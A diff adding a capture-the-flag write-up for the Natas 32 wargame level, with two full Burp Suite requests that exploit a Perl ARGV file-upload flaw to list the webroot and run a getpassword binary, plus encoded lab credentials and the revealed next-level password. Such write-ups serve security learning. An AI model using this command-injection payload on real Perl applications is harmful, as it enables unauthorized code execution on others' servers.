@@ -1,0 +1,87 @@
+This lab has the same setup as the previous lab but this time you're given the
+hint: "This time you need to prove that you got code exec. There is a binary in
+the webroot that you need to execute.". So we'll have to inject code to find an
+executable and execute it to receive the next password. 
+
+This lab is not too different from the previous lab. I used the same burp suite
+POST request with a few minor edits. Obviously, I had to change natas31 to
+natas32 in the url fields. Then I had to update the base64 authorization string,
+to do this I used php:
+
+<prompt>$ php -a
+php -a
+Interactive mode enabled
+
+php > echo base64_encode("natas32:no1vohsheCaiv3ieH4em1ahchisainge");
+echo base64_encode("natas32:no1vohsheCaiv3ieH4em1ahchisainge");
+bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==
+
+Then I followed the example provided here:
+https://axcheron.github.io/writeups/otw/natas/#natas-32-solution
+
+There were two burp suite requests I made
+
+1.
+
+POST /index.pl?ls%20.%20| HTTP/1.1
+Host: natas32.natas.labs.overthewire.org
+Content-Length: 348
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==
+Origin: http://natas32.natas.labs.overthewire.org
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFgVNNE987xWnwuo7
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,und;q=0.8
+Connection: close
+
+------WebKitFormBoundaryFgVNNE987xWnwuo7
+Content-Disposition: form-data; name="file"
+
+ARGV
+------WebKitFormBoundaryFgVNNE987xWnwuo7
+Content-Disposition: form-data; name="file"; filename="abc"
+
+abcde
+------WebKitFormBoundaryFgVNNE987xWnwuo7
+Content-Disposition: form-data; name="submit"
+
+Upload
+------WebKitFormBoundaryFgVNNE987xWnwuo7--
+
+Note: This request showed me that there was an executable named getpassword in
+the current working directory.
+
+2.
+
+POST /index.pl?./getpassword%20| HTTP/1.1
+Host: natas32.natas.labs.overthewire.org
+Content-Length: 348
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXMzMjpubzF2b2hzaGVDYWl2M2llSDRlbTFhaGNoaXNhaW5nZQ==
+Origin: http://natas32.natas.labs.overthewire.org
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFgVNNE987xWnwuo7
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,und;q=0.8
+Connection: close
+
+------WebKitFormBoundaryFgVNNE987xWnwuo7
+Content-Disposition: form-data; name="file"
+
+ARGV
+------WebKitFormBoundaryFgVNNE987xWnwuo7
+Content-Disposition: form-data; name="file"; filename="abc"
+
+abcde
+------WebKitFormBoundaryFgVNNE987xWnwuo7
+Content-Disposition: form-data; name="submit"
+
+Upload
+------WebKitFormBoundaryFgVNNE987xWnwuo7--
+
+Note: This actually ran the getpassword request.
+
+natas33 password: shoogeiGa2yee3de6Aex8uaXeech5eey
